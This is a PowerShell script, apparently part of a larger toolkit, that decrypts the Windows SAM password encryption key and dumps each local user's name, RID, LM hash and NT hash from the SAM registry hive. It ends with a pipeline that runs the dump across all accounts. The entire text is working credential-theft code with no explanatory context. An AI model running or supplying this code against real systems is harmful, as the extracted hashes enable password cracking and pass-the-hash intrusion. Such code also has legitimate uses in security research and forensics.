function Get-PasswordHash {
 param(
    [byte[]]$Pek,
    $Key,
    $Rid,
    [switch]$LmHash
 )
 $index = 14
 $type = 2
 if ($LmHash) {
    $index = 13
    $type = 1
 }
 $hash_enc = Get-VariableAttribute $key -Index $Index
 if ($null -eq $hash_enc) {
    return @()
 }
 $hash_dec = Unprotect-PasswordHash -Key $Pek -Data $hash_enc -Rid $Rid -Type $type
 if ($hash_dec.Length -gt 0) {
    Unprotect-PasswordHashDES -Hash $hash_dec -Rid $Rid
 }
}

function Get-UserHashes {
 param(
     [Parameter(Mandatory)]
     [byte[]]$Pek,
     [Parameter(Mandatory, ValueFromPipeline)]
     $Key
 )

 PROCESS {
    try {
        if ($null -eq $Key["V"]) {
            return
        }
        $rid = [int]::Parse($Key.Name, "HexNumber")
         $name = Get-VariableAttribute $key -Index 1
         [PSCustomObject]@{
            Name=[System.Text.Encoding]::Unicode.GetString($name)
            LmHash = Get-PasswordHash $Pek $key $rid -LmHash
            NtHash = Get-PasswordHash $Pek $key $rid
            Rid = $rid
         }
    } catch {
        Write-Error $_
    }
 }
}
$pek = Unprotect-PasswordEncryptionKey
ls "SEC:\SAM\SAM\Domains\Account\Users" | Get-UserHashes $pek